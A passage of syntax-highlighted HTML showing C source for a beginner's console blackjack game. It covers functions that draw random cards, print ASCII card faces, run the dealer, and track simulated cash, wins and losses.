punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Heart Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> heart<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Displays Spade Card Image</span><span class="token punctuation">{</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>    k<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 9 or less, print card with that number</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  %d  |\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 10, print card with J (Jack) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  J  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11, print card with A (Ace) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  A  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is Ace, change value to 11 or 1 depending on dealer total</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 12, print card with Q (Queen) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  Q  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 13, print card with K (King) on face</span>    <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Spade Card</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%c    |\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|  K  |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|    %c|\n"</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Set card value to 10</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">int</span> <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Generates random card</span><span class="token punctuation">{</span>     <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>     random_card <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>            <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>random_card<span class="token operator">==</span><span class="token number">4</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         l<span class="token operator">=</span>k<span class="token punctuation">;</span>     <span class="token punctuation">}</span>         <span class="token keyword">return</span> l<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function   </span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Plays game</span><span class="token punctuation">{</span>     <span class="token keyword">int</span> p<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// holds value of player_total</span>     <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// counter for asking user to hold or stay (aka game turns)</span>     <span class="token keyword">char</span> choice3<span class="token punctuation">;</span>     cash <span class="token operator">=</span> cash<span class="token punctuation">;</span>     <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nCash: $%d\n"</span><span class="token punctuation">,</span>cash<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints amount of cash user has</span>     <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random card</span>     player_total <span class="token operator">=</span> p <span class="token operator">+</span> l<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Computes player total</span>     p <span class="token operator">=</span> player_total<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour Total is %d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints player total</span>     <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Computes and prints dealer total</span>     <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prompts user to enter bet amount</span>     <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//While loop used to keep asking user to hit or stay at most twenty-one times</span>                  <span class="token comment" spellcheck="true">//  because there is a chance user can generate twenty-one consecutive 1's</span>     <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If user total is 21, win</span>         <span class="token punctuation">{</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>             cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>             dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>             <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player total is over 21, loss</span>         <span class="token punctuation">{</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWoah Buddy, You Went WAY over.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>             cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>             dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>             <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">&lt;=</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player total is less than 21, ask to hit or stay</span>         <span class="token punctuation">{</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nWould You Like to Hit or Stay?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice3<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'H'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'h'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice3<span class="token operator">!=</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>             <span class="token punctuation">{</span>                                                                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please Enter H to Hit or S to Stay.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice3<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'H'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'h'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If Hit, continues</span>             <span class="token punctuation">{</span>                  <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 player_total <span class="token operator">=</span> p <span class="token operator">+</span> l<span class="token punctuation">;</span>                 p <span class="token operator">=</span> player_total<span class="token punctuation">;</span>                 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour Total is %d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">==</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Is dealer total is 21, loss</span>                  <span class="token punctuation">{</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has the Better Hand. You Lose.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      loss <span class="token operator">=</span> loss<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                      cash <span class="token operator">=</span> cash <span class="token operator">-</span> bet<span class="token punctuation">;</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>                      dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                      <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">></span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If dealer total is over 21, win</span>                  <span class="token punctuation">{</span>                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDealer Has Went Over!. You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                      cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>                      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>                      dealer_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                      <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">}</span>             <span class="token punctuation">}</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice3<span class="token operator">==</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If Stay, does not continue</span>             <span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou Have Chosen to Stay at %d. Wise Decision!\n"</span><span class="token punctuation">,</span> player_total<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>          <span class="token punctuation">}</span>             i<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//While player total and dealer total are less than 21, re-do while loop </span>     <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End While Loop</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span><span class="token keyword">void</span> <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Function to play for dealer AI</span><span class="token punctuation">{</span>     <span class="token keyword">int</span> z<span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">&lt;</span><span class="token number">17</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>      <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Generates random seed for rand() function</span>      z<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number generated is 10 or less, keep that value</span>      <span class="token punctuation">{</span>         d<span class="token operator">=</span>z<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">></span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number generated is more than 11, change value to 10</span>      <span class="token punctuation">{</span>         d<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>z<span class="token operator">==</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If random number is 11(Ace), change value to 11 or 1 depending on dealer total</span>      <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             d<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>             d<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>      <span class="token punctuation">}</span>     dealer_total <span class="token operator">=</span> dealer_total <span class="token operator">+</span> d<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nThe Dealer Has a Total of %d"</span><span class="token punctuation">,</span> dealer_total<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Prints dealer total</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function </span><span class="token keyword">void</span> <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Function for when user selects 'Stay'</span><span class="token punctuation">{</span>     <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//If stay selected, dealer continues going</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>dealer_total<span class="token operator">>=</span><span class="token number">17</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>player_total<span class="token operator">>=</span>dealer_total<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player's total is more than dealer's total, win</span>      <span class="token punctuation">{</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnbelievable! You Win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         won <span class="token operator">=</span> won<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         cash <span class="token operator">=</span> cash<span class="token operator">+</span>bet<span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span><span class="token punctuation">,</span> won<span class="token punctuation">,</span> loss<span class="token 